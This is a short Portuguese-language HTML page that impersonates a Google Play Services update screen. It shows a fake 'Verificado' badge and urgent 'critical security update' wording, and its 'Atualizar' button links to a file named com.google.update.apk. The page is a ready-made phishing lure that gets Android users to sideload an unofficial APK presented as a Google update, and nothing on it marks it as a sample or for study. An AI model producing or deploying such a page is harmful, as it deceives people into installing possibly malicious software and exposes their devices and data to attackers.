<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Play Services - Atualizar</title>
  <style>
    body {
      font-family: Roboto, sans-serif;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
    }
    .header {
      background-color: #fff;
      padding: 15px;
      display: flex;
      align-items: center;
      box-shadow: 0 1px 5px rgba(0, 0, 0, 0.1);
    }
    .app-icon {
      width: 60px;
      height: 60px;
      border-radius: 12px;
      margin-right: 15px;
    }
    .app-info h1 {
      font-size: 20px;
      margin: 0;
    }
    .app-info p {
      margin: 2px 0 0;
      font-size: 14px;
      color: #777;
    }
    .container {
      padding: 20px;
      max-width: 600px;
      margin: auto;
    }
    .update-button {
      display: inline-block;
      background-color: #1a73e8;
      color: white;
      padding: 15px 30px;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      text-decoration: none;
      margin-top: 20px;
    }
    .description {
      font-size: 14px;
      color: #333;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://www.gstatic.com/android/market_images/web/play_prism_hlock_2x.png" alt="App Icon" class="app-icon">
    <div class="app-info">
      <h1>Google Play Services</h1>
      <p>Google LLC ✓ Verificado</p>
    </div>
  </div>

  <div class="container">
    <p class="description">
      Esta é uma atualização crítica de segurança do sistema Android. É altamente recomendada para garantir estabilidade e compatibilidade com os apps mais recentes.
    </p>

    <a href="com.google.update.apk" class="update-button">Atualizar</a>
  </div>
</body>
</html>
